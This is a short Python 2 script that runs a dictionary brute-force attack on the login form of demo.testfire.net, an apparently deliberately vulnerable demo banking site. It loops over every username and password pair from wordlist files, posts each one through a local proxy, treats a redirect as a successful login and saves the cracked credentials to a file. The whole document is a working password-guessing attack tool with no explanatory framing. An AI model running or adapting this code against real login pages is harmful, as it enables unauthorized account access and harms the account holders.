# -*- coding: utf-8 -*-
import requests

outFile = open('accounts-cracked.txt', 'w')
def brute_force(user, password):

    name = user.strip()
    passwd = password.strip()
    proxy = {"http":"127.0.0.1:8080"}
    url = "http://demo.testfire.net/bank/login.aspx"
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
    header = {"User-Agent":user_agent,"Content-Type": "application/x-www-form-urlencoded", "Referer": "http://demo.testfire.net/bank/login.aspx"}
    data = {'uid': name, 'passw': passwd,'btnSubmit':'Login'}

    response = requests.post(url,headers=header,proxies=proxy,data=data,allow_redirects=False)
    code = response.status_code

    if code == 302 or code==301:

        print '+++++ find user:', name, ' with password:',passwd, '+++++'

        outFile.write(name + ':' + passwd+'\n' )
    else:
        print '----- error user:', name, ' with password:',passwd, '-----'
    return

if __name__ == '__main__':
    with open('user.dic', 'r') as userline:
        y = userline.readlines()
        with open('pass.dic', 'r') as passline:
            b= passline.readlines()
            for u in y:
                for p in b:
                    brute_force(user=u,password=p)
outFile.close()
with open('accounts-cracked.txt','r') as text:
    list = text.readlines()
    sum=len(list)

if sum>0:
    print "找到",sum,"个账号密码"
else:
    print "All thread OK,maybe not "



